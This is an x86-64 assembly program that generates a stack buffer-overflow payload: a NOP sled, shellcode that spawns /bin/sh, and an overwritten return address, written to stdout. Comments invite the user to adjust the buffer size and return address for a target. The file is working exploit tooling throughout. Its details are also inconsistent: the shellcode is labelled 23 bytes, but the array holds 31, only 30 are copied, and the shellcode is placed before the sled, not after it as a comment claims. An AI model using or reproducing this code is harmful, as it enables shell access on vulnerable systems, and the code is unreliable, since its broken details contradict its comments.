section .data
    ; The payload length depends on vulnerable buffer size; adjust accordingly
    buffer_size equ 136            ; buffer size before return address (adjust!)

    ; The shellcode to spawn /bin/sh (23 bytes)
    shellcode db 0x48,0x31,0xc0,0x48,0x89,0xe7,0x50,0x48,0xb8,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x50,0x48,0x89,0xe7,0x48,0x31,0xf6,0x48,0x31,0xd2,0xb0,0x3b,0x0f,0x05

    ret_addr dq 0x7fffffffe520     ; Return address to jump to shellcode on stack (adjust!)

section .bss
    payload resb buffer_size + 8   ; buffer + ret address

section .text
    global _start

_start:
    ; 1. Fill payload with NOP (0x90) sled
    mov rcx, buffer_size + 8
    mov rdi, payload
    mov al, 0x90
    rep stosb

    ; 2. Copy shellcode at start of payload (NOP sled followed by shellcode)
    mov rsi, shellcode
    mov rcx, 30                  ; shellcode length
    mov rdi, payload
    call copy_shellcode

    ; 3. Overwrite return address at the end of payload
    mov rax, [rel ret_addr]
    mov [payload + buffer_size], rax

    ; 4. Write payload to stdout (or file)
    mov rax, 1                  ; sys_write
    mov rdi, 1                  ; stdout
    mov rsi, payload
    mov rdx, buffer_size + 8
    syscall

    ; 5. Exit cleanly
    mov rax, 60                 ; sys_exit
    xor rdi, rdi
    syscall

; -------------------------
; copy_shellcode:
; copies rcx bytes from rsi to rdi
copy_shellcode:
    test rcx, rcx
    jz .done
.copy_loop:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    loop .copy_loop
.done:
    ret
